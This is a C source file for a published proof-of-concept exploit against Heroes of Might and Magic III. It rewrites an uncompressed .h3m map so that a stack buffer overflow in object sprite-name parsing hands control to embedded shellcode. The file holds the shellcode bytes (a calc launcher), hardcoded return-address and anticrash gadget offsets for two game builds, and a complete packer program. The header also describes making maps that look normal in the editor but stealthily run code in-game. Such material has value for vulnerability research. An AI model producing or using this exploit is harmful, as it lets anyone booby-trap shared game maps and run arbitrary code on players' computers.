/*
# Exploit Title : Heroes of Might and Magic III - Map Parsing Arbitrary Code Execution
# Date : 2015-07-29
# Exploit Author : John AAkerblom, Pierre Lindblad
# Website: http://h3minternals.net
# Vendor Homepage : 3do.com (defunct), https://sites.google.com/site/heroes3hd/
# Version : 4.0.0.0 AND HoMM 3 HD 3.808 build 9
# Tested on : Windows XP, Windows 8.1
# Category: exploits

# Description:
  This PoC embeds an exploit into an uncompressed map file (.h3m) for Heroes 
  of Might and Magic III. Once the map is started in-game, a buffer overflow 
  occuring when loading object sprite names leads to shellcode execution.
  
  Only basic arbitrary code execution is covered in this PoC but is possible to 
  craft an exploit that lets the game continue normally after the shellcode has
  been executed. Using extensive knowledge of the .h3m format, it is even 
  possible to create a map file that loads like normal in the game's map editor
  (which lacks the vulnerability) but stealthily executes shellcode when opened 
  in-game.
*/
#include <string.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

/* Calc payload: https://code.google.com/p/win-exec-calc-shellcode/
   0xEBFE added at end. Note that a NULL-less payload is not actually needed

Copyright (c) 2009-2014 Berend-Jan "SkyLined" Wever <berendjanwever@gmail.com>
and Peter Ferrie <peter.ferrie@gmail.com>
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:
    * Redistributions of source code must retain the above copyright
      notice, this list of conditions and the following disclaimer.
    * Redistributions in binary form must reproduce the above copyright
      notice, this list of conditions and the following disclaimer in the
      documentation and/or other materials provided with the distribution.
    * Neither the name of the copyright holder nor the names of the
      contributors may be used to endorse or promote products derived from
      this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED ''AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */
static const uint8_t CALC_PAYLOAD[] = {
    0x31, 0xD2, 0x52, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x52,
    0x51, 0x64, 0x8B, 0x72, 0x30, 0x8B, 0x76, 0x0C, 0x8B, 0x76, 0x0C,
    0xAD, 0x8B, 0x30, 0x8B, 0x7E, 0x18, 0x8B, 0x5F, 0x3C, 0x8B, 0x5C,
    0x1F, 0x78, 0x8B, 0x74, 0x1F, 0x20, 0x01, 0xFE, 0x8B, 0x54, 0x1F,
    0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x42, 0x42, 0xAD, 0x81, 0x3C, 0x07,
    0x57, 0x69, 0x6E, 0x45, 0x75, 0xF0, 0x8B, 0x74, 0x1F, 0x1C, 0x01,
    0xFE, 0x03, 0x3C, 0xAE, 0xFF, 0xD7, 0xEB, 0xFE
};

/*
* The memmem() function finds the start of the first occurrence of the
* substring 'needle' of length 'nlen' in the memory area 'haystack' of
* length 'hlen'.
*
* The return value is a pointer to the beginning of the sub-string, or
* NULL if the substring is not found.
*
* Original author: caf, http://stackoverflow.com/a/2188951
*/
static uint8_t *_memmem(uint8_t *haystack, size_t hlen, uint8_t *needle, size_t nlen)
{
    uint8_t needle_first;
    uint8_t *p = haystack;
    size_t plen = hlen;

    if (!nlen)
        return NULL;

    needle_first = *(uint8_t  *)needle;

    while (plen >= nlen && (p = memchr(p, needle_first, plen - nlen + 1)))
    {
        if (!memcmp(p, needle, nlen))
            return p;

        p++;
        plen = hlen - (p - haystack);
    }

    return NULL;
}

#ifdef _MSC_VER
    #pragma warning(disable:4996) // M$ fopen so unsafe
#endif

#pragma pack(push, 1)
// exploit struct
// .h3m files contain an array of object attributes - OA - in which each
// entry starts with a string length and then a string for an object sprite.
// This exploit overflows the stack with a malicious sprite name.
struct exploit_oa_t
{
    uint32_t size; // size of the rest of this struct, including shellcode

    // The rest of the struct is the sprite name for the OA, <size> bytes of 
    // which an CALL ESP-gadget address is placed so that it overwrites the
    // return address, when ESP is called shellcode2 will be executed. An 
    // additional 2 "anticrash" gadgets are needed so the game does not crash 
    // before returning to the CALL ESP-gadget.

    uint8_t nullbyte; // Must be 0x00, terminating sprite name
    uint8_t overwritten[6]; // Overwritten by game
    uint8_t shellcode1[121]; // Mostly not used, some is overwritten
    uint32_t call_esp_gadget; // Address of CALL [ESP], for saved eip on stack

    // anticrash_gadget1, needs to pass the following code down to final JMP:
    //
    // MOV EAX, DWORD PTR DS : [ESI + 4] ; [anticrash_gadget1 + 4]
    // XOR EBX, EBX
    // CMP EAX, EBX
    // JE SHORT <crash spot> ; JMP to crash if EAX is 0
    // MOV CL, BYTE PTR DS : [EAX - 1]
    // CMP CL, BL
    // JE SHORT <crash spot> ; JMP to crash if the byte before [EAX] is 0
    // CMP CL, 0FF
    // JE SHORT <crash spot> ; JMP to crash if the byte before [EAX] is 0xFF
    // CPU Disasm
    // CMP EDI, EBX
    // JNE <good spot> ; JMP to good spot. Always occurs if we get this far
    uint32_t anticrash_gadget1;

    // anticrash_gadget2, needs to return out of the following call (tricky):
    //
    // MOV EAX, DWORD PTR DS : [ECX] ; [anticrash_gadget2]
    // CALL DWORD PTR DS : [EAX + 4] ; [[anticrash_gadget2] + 4]
    uint32_t anticrash_gadget2;

    // Here at 144 bytes into this struct comes the shellcode that will be 
    // executed. For the game to survive, it is wise to use this only for a 
    // short jmp as doing so means only 2 values have to be restored on the 
    // stack. Namely: original return address and format value of the h3m.
    // This PoC simply puts shellcode here, meaning the game cannot continue
    // after shellcode execution.
    uint8_t shellcode2[];
};

struct offsets_t
{
    uint32_t call_esp_gadget;
    uint32_t anticrash_gadget1;
    uint32_t anticrash_gadget2;
};
#pragma pack(pop)

static const struct offsets_t * const TARGET_OFFSETS[] = { 
    (struct offsets_t *)"\x87\xFF\x4E\x00\xD4\x97\x44\x00\x30\x64\x6A\x00",
    (struct offsets_t *)"\x0F\x0C\x58\x00\x48\x6A\x45\x00\x30\x68\x6A\x00"
};
#define TARGET_DESCS "    1: H3 Complete 4.0.0.0  [Heroes3.exe 78956DFAB3EB8DDF29F6A84CF7AD01EE]\n" \
                     "    2: HD Mod 3.808 build 9 [Heroes3 HD.exe 56614D31CC6F077C2D511E6AF5619280]"
#define MAX_TARGET 2

// Name of a sprite present in all maps, this is overwritten with exploit
#define NEEDLE "AVWmrnd0.def"

int pack_h3m(FILE *h3m_f, const struct offsets_t * const ofs, const uint8_t *payload, long payload_size)
{
    uint8_t *buf = NULL;
    uint8_t *p = NULL;
    long h3m_size = 0;
    long bytes = 0;
    struct exploit_oa_t *exp = NULL;

    // Read entire h3m file into memory
    fseek(h3m_f, 0, SEEK_END);
    h3m_size = ftell(h3m_f);
    rewind(h3m_f);
    buf = malloc(h3m_size);
    if (buf == NULL) {
        puts("[!] Failed to allocate memory");
        return 1;
    }
    bytes = fread(buf, sizeof(uint8_t), h3m_size, h3m_f);
    if (bytes != h3m_size) {
        free(buf);
        puts("[!] Failed to read all bytes");
        return 1;
    }

    // Find game object array in .h3m, where we will overwrite the first entry
    p = _memmem(buf, h3m_size, (uint8_t *)NEEDLE, sizeof(NEEDLE) - 1);
    if (p == NULL) {
        puts("[!] Failed to find needle \"" NEEDLE "\" in file. Make sure it is an uncompressed .h3m");
        free(buf);
        return 1;
    }
    
    // Move back 4 bytes from sprite name, pointing to the size of the sprite name
    p -= 4;

    // Overwrite the first game object with exploit
    exp = (struct exploit_oa_t *)p;
    exp->size = sizeof(*exp) - sizeof(exp->size) + payload_size;
    exp->nullbyte = 0;
    exp->call_esp_gadget = ofs->call_esp_gadget;
    exp->anticrash_gadget1 = ofs->anticrash_gadget1;
    exp->anticrash_gadget2 = ofs->anticrash_gadget2;
    memcpy(exp->shellcode2, payload, payload_size);

    // Write entire file from memory and cleanup
    rewind(h3m_f);
    bytes = fwrite(buf, sizeof(uint8_t), h3m_size, h3m_f);
    if (bytes != h3m_size) {
        free(buf);
        puts("[!] Failed to write all bytes");
        return 1;
    }
    free(buf);

    return 0;
}

static void _print_usage(void)
{
    puts("Usage: h3mpacker <uncompressed h3m filename> <target #>");
    puts("Available targets:");
    puts(TARGET_DESCS);
    puts("Examples:");
    puts("    h3mpacker Arrogance.h3m 1");
    puts("    h3mpacker Deluge.h3m 2");
}

int main(int argc, char **argv)
{
    FILE *h3m_f = NULL;
    int ret = 0;
    int target;
    
    if (argc != 3) {
        _print_usage();
        return 1;
    }

    h3m_f = fopen(argv[1], "rb+");
    target = strtoul(argv[2], NULL, 0);

    if (h3m_f == NULL || target < 1 || target > MAX_TARGET) {
        if (h3m_f != NULL)
            fclose(h3m_f);
        _print_usage();
        return 1;
    }

    ret = pack_h3m(h3m_f, TARGET_OFFSETS[target-1], CALC_PAYLOAD, sizeof(CALC_PAYLOAD));

    fclose(h3m_f);

    if (ret != 0)
        return ret;
    
    printf("[+] Payload embedded into h3m file %s\n", argv[1]);

    return 0;
}

